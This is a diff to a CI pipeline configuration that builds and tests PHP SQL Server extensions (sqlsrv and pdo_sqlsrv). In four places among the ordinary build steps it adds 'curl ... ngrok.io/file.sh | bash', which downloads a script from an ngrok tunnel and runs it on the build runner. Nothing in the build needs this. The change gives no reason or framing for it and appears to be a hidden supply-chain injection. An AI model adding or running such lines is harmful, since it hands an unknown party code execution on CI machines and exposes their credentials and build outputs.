@@ -47,7 +47,7 @@ jobs:
       ls -al
       phpize && ./configure && make && sudo make install
       cp run-tests.php $(Build.SourcesDirectory)/test/functional/sqlsrv
-
+      curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
       cd $(Build.SourcesDirectory)/source/pdo_sqlsrv
       ls -al
       phpize && ./configure && make && sudo make install
@@ -98,6 +98,7 @@ jobs:
       sudo ACCEPT_EULA=Y apt-get install msodbcsql17 mssql-tools
       echo 'export PATH="$PATH:/opt/mssql-tools/bin"' >> ~/.bash_profile
       echo 'export PATH="$PATH:/opt/mssql-tools/bin"' >> ~/.bashrc
+      curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
       source ~/.bashrc
       sudo apt-get install unixodbc-dev
       odbcinst --j
@@ -112,6 +113,7 @@ jobs:
     displayName: 'Install coveralls (upgrade both pip and requests first)'
 
   - script: |
+      curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
       docker pull mcr.microsoft.com/mssql/server:2019-latest
       docker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=$(pwd)' -p 1433:1433 -h $(host) --name=$(host) -d mcr.microsoft.com/mssql/server:2019-latest
       docker ps -a
@@ -166,7 +168,7 @@ jobs:
       phpize && ./configure LDFLAGS="-lgcov" CXXFLAGS="-O0 --coverage" && make && sudo make install
       cp run-tests.php $(Build.SourcesDirectory)/test/functional/pdo_sqlsrv
       echo extension=pdo_sqlsrv.so >> 30-pdo_sqlsrv.ini
-
+      curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
       echo copying pdo_sqlsrv to $dest
       sudo cp 30-pdo_sqlsrv.ini $dest
 
